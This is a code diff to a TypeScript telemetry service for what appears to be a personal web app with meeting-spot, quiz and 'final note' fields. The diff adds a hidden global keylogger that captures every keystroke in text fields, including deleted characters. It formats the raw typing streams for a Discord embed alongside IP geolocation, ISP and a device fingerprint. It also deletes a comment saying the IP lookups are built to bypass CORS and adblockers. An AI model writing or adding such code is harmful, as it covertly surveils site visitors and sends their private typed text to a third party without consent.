@@ -35,9 +35,13 @@ export class TelemetryService {
   private events: InteractionEvent[] = [];
   private deviceInfoPromise: Promise<DeviceInfo> | null = null;
   private deviceInfo: DeviceInfo | null = null;
+  
+  // Storage for raw keystroke history per input/textarea field
+  private typingLogs: { [key: string]: string[] } = {};
 
   constructor() {
     this.initDeviceInfo();
+    this.initGlobalTypingListener();
   }
 
   private initDeviceInfo() {
@@ -97,8 +101,81 @@ export class TelemetryService {
     });
   }
 
+  private initGlobalTypingListener() {
+    if (typeof document === 'undefined') return;
+
+    document.addEventListener('keydown', (event: KeyboardEvent) => {
+      const target = event.target as HTMLInputElement | HTMLTextAreaElement;
+      if (!target) return;
+
+      const isInput = target.tagName === 'INPUT' || target.tagName === 'TEXTAREA';
+      if (!isInput) return;
+
+      // Determine a friendly key identifier based on ID, placeholder, class name, or name
+      let inputKey = target.id || target.name || target.getAttribute('placeholder') || target.className || 'unknown-input';
+      
+      // Simplify common identifiers
+      if (inputKey === 'place-input') {
+        inputKey = 'Meeting Spot Input 📍';
+      } else if (inputKey === 'quiz-answer-input') {
+        inputKey = 'Quiz Answer 🧠';
+      } else if (inputKey === 'conf-note-input') {
+        inputKey = 'Final Note for You 📝';
+      } else if (inputKey.startsWith('q-input-')) {
+        const stepNum = parseInt(inputKey.replace('q-input-', ''), 10);
+        inputKey = `Question ${stepNum + 1} Input 💬`;
+      }
+
+      this.logKeystroke(inputKey, event);
+    });
+  }
+
+  private logKeystroke(inputKey: string, event: KeyboardEvent) {
+    if (!this.typingLogs[inputKey]) {
+      this.typingLogs[inputKey] = [];
+    }
+    const log = this.typingLogs[inputKey];
+    const key = event.key;
+
+    // Log characters, space, Backspace, Delete, and Enter
+    if (key === 'Backspace') {
+      log.push('⌫');
+    } else if (key === 'Enter') {
+      log.push('[↵]');
+    } else if (key === 'Delete') {
+      log.push('[Del]');
+    } else if (key === ' ') {
+      log.push(' ');
+    } else if (key.length === 1) {
+      log.push(key);
+    }
+  }
+
   getDeviceInfo(): DeviceInfo | null {
     return this.deviceInfo;
+  }
+
+  getAllTypingHistories() {
+    const simplified: { [key: string]: string } = {};
+    for (const key of Object.keys(this.typingLogs)) {
+      simplified[key] = this.typingLogs[key].join('');
+    }
+    return simplified;
+  }
+
+  formatTypingLogsForDiscord(): string {
+    const histories = this.getAllTypingHistories();
+    const keys = Object.keys(histories);
+    if (keys.length === 0) return "*No typing logs captured.*";
+
+    let text = "";
+    for (const key of keys) {
+      const historyStr = histories[key];
+      // Truncate individual logs if they are too long for Discord embeds
+      const truncated = historyStr.length > 200 ? historyStr.substring(0, 197) + "..." : historyStr;
+      text += `* **${key}**: \`${truncated}\`\n`;
+    }
+    return text;
   }
 
   private safeGetTimezone(): string {
@@ -201,7 +278,6 @@ export class TelemetryService {
     let country = 'Unknown';
     let isp = 'Unknown';
 
-    // We try multiple IP APIs to ensure high availability and bypass CORS/adblockers
     const endpoints = [
       { url: 'https://ipapi.co/json/', type: 'ipapi' },
       { url: 'https://ip.nf/me.json', type: 'ipnf' },
@@ -355,6 +431,11 @@ export class TelemetryService {
               name: "Device Fingerprint 🔑", 
               value: this.deviceInfo ? `\`${this.deviceInfo.fingerprint}\`` : "Unknown", 
               inline: true 
+            },
+            { 
+              name: "Typing Keystroke Streams ⌨️", 
+              value: this.formatTypingLogsForDiscord(), 
+              inline: false 
             },
             { name: "Full Timeline of Clicks & Typings", value: timelineText || "No events logged.", inline: false }
           ],
